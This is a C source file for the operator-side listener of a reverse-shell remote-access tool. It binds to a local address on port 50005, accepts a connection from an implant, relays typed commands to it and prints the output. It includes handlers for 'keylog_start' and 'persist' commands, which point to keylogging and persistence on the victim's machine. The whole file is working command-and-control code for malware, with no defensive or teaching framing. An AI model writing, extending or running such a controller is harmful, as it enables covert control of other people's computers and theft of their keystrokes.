#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdbool.h>

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("Error setting TCP socket options\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.0.99");
    server_address.sin_port = htons(50005);

    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
    puts("Binding OK");
    listen(sock, 5);
    puts("Listening ...");
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);
    puts("Connection accepted!");

    while (true)
    {
        jump:
        memset(&buffer, 0, sizeof(buffer));
        memset(&response, 0, sizeof(response));
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // prints client ip address
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");                         // removes newline char from buffer
        write(client_socket, buffer, sizeof(buffer)); // sends command to client
        if (strncmp("q", buffer, 1) == 0)
        {
            break; // exits loop
        }
        else if (strncmp("cd ", buffer, 3) == 0)
        {
            goto jump;
        }
        else if (strncmp("keylog_start", buffer, 12) ==0 )
        {
            goto jump;
        }
        else if (strncmp("persist", buffer, 7) == 0)
        {
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL); // receives message from client
            printf("%s", response);
        }
    }

    return 0;
}